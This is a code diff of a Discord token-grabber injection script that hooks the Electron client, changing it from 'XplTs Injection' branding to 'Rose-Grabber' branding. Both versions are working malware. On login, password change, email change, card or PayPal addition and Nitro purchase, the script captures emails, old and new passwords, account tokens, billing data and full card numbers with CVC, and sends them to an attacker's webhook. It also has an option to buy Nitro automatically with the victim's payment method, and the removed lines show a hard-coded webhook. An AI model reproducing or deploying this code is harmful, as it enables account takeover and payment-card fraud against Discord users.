@@ -1,24 +1,22 @@
- const args = process.argv;
-import fs from 'fs';
-import path from 'path';
-import https from 'https';
-import fetch from 'node-fetch';
-import querystring from 'querystring';
-import { BrowserWindow, session } from 'electron';
-
+const args = process.argv;
+const fs = require('fs');
+const path = require('path');
+const https = require('https');
+const querystring = require('querystring');
+const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: false, 
-  ping_on_run: true, 
-  ping_val: '@everyone',
-  embed_name: 'XplTs Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1237348402791055390/1303683883279061012/xplts.png?ex=6735377b&is=6733e5fb&hm=c17c33e4a6eb171c463d6fb92abf580d96b66b858edbd7469e461031ff4beb47&'.replace(/ /g, '%20'), 
-  embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Weeis3/index/main/injection.js', 
+  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
+  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
+  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
+  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
+  embed_name: 'Rose-Grabber', //name of the webhook thats gonna send the info
+  embed_icon: 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/%24rose-wh.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
+  injection_url: 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/injection/injection.js', //injection url for when it reinjects
   /**
-   
+   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -649,7 +647,6 @@ const hooker = async (content) => {
   req.end();
 };
 
-
 const login = async (email, password, token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
@@ -663,17 +660,17 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Information**',
-            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
+            name: '**Account Info**',
+            value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -683,19 +680,13 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'XplTs Injection・https://github.com/Weeis3/XplTs_Bot-Builder',
-            icon_url: "https://cdn.discordapp.com/attachments/1237348402791055390/1303683883279061012/xplts.png?ex=6735377b&is=6733e5fb&hm=c17c33e4a6eb171c463d6fb92abf580d96b66b858edbd7469e461031ff4beb47&"
+          text: '🎉・Discord Injection by Rose Injector・https://github.com/DamagingRose/Rose-Grabber',
         },
       },
     ],
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
-  try {
-    await hooker(content);
-    } catch (error) {
-        console.error("Error sending webhook:", error);
-        await sendErrorToWebhook(error); // Send error to the specified webhook
-    }
+  hooker(content);
 };
 
 const passwordChanged = async (oldpassword, newpassword, token) => {
@@ -712,16 +703,16 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
+            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -731,19 +722,13 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'XplTs Injection・https://github.com/Weeis3/XplTs_Bot-Builder',
-            icon_url: "https://cdn.discordapp.com/attachments/1237348402791055390/1303683883279061012/xplts.png?ex=6735377b&is=6733e5fb&hm=c17c33e4a6eb171c463d6fb92abf580d96b66b858edbd7469e461031ff4beb47&"
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
-  try {
-    await hooker(content);
-    } catch (error) {
-        console.error("Error sending webhook:", error);
-        await sendErrorToWebhook(error); // Send error to the specified webhook
-    }
+  hooker(content);
 };
 
 const emailChanged = async (email, password, token) => {
@@ -760,16 +745,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `New Email: **${email}**\nPassword: **${password}**`,
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -779,88 +764,56 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'XplTs Injection・https://github.com/Weeis3/XplTs_Bot-Builder',
-            icon_url: "https://cdn.discordapp.com/attachments/1237348402791055390/1303683883279061012/xplts.png?ex=6735377b&is=6733e5fb&hm=c17c33e4a6eb171c463d6fb92abf580d96b66b858edbd7469e461031ff4beb47&"
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
   };
   if (config.ping_on_run) content['content'] = config.ping_val;
-  try {
-    await hooker(content);
-    } catch (error) {
-        console.error("Error sending webhook:", error);
-        await sendErrorToWebhook(error); // Send error to the specified webhook
-    }
+  hooker(content);
 };
 
-
-const sendErrorToWebhook = async (error) => {
-    const errorContent = {
-        username: "Error Logger",
-        content: `An error occurred: \`\`\`${error}\`\`\``
-    };
-
-    try {
-        await fetch('https://discord.com/api/webhooks/1309272074208153670/Tx-3Gbi28D3Sk_cSwj5Du1e4icmeNYQmvg45o9Ebji3oRWhqiAumFxnjkNKDYBhHVR2T', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(errorContent)
-        });
-    } catch (err) {
-        console.error("Failed to send error to webhook:", err);
-    }
+const PaypalAdded = async (token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Paypal Added**',
+            value: `Time to buy some nitro baby 😩`,
+            inline: false,
+          },
+          {
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: false,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+        author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+        },
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
 };
-
-const PaypalAdded = async (token) => { 
-   const json = await getInfo(token); 
-   const nitro = getNitro(json.premium_type); 
-   const badges = getBadges(json.flags); 
-   const billing = await getBilling(token); 
-   const content = { 
-     username: config.embed_name, 
-     avatar_url: config.embed_icon, 
-     embeds: [ 
-       { 
-         color: config.embed_color, 
-         fields: [ 
-           { 
-             name: '**Paypal Added**', 
-             value: `Time to buy some nitro baby 😩`, 
-             inline: false, 
-           }, 
-           { 
-             name: '**Discord Information**', 
-             value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`, 
-             inline: true, 
-           }, 
-           { 
-             name: '<:hackerblack:1095747410539593800> **Token**', 
-             value: `\`${token}\``, 
-             inline: false, 
-           }, 
-         ], 
-         author: { 
-           name: json.username + '#' + json.discriminator + ' | ' + json.id, 
-           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`, 
-         }, 
-         footer: { 
-             text: 'XplTs Injection・https://github.com/Weeis3/XplTs_Bot-Builder', 
-             icon_url: "https://cdn.discordapp.com/attachments/1237348402791055390/1303683883279061012/xplts.png?ex=6735377b&is=6733e5fb&hm=c17c33e4a6eb171c463d6fb92abf580d96b66b858edbd7469e461031ff4beb47&" 
-         }, 
-       }, 
-     ], 
-   }; 
-   if (config.ping_on_run) content['content'] = config.ping_val; 
-   try {
-       await hooker(content);
-   } catch (error) {
-       console.error("Error sending webhook:", error);
-       await sendErrorToWebhook(error); // Send error to the specified webhook
-   }
-}; 
 
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
   const json = await getInfo(token);
@@ -880,12 +833,12 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -895,8 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'XplTs Injection・https://github.com/Weeis3/XplTs_Bot-Builder',
-            icon_url: "https://cdn.discordapp.com/attachments/1237348402791055390/1303683883279061012/xplts.png?ex=6735377b&is=6733e5fb&hm=c17c33e4a6eb171c463d6fb92abf580d96b66b858edbd7469e461031ff4beb47&"
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
@@ -925,12 +877,12 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: '**Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -940,8 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'XplTs Injection・https://github.com/Weeis3/XplTs_Bot-Builder',
-            icon_url: "https://cdn.discordapp.com/attachments/1237348402791055390/1303683883279061012/xplts.png?ex=6735377b&is=6733e5fb&hm=c17c33e4a6eb171c463d6fb92abf580d96b66b858edbd7469e461031ff4beb47&"
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
@@ -1032,6 +983,4 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
   }
 });
-import core from './core.asar';
-export default core;
-
+module.exports = require('./core.asar');
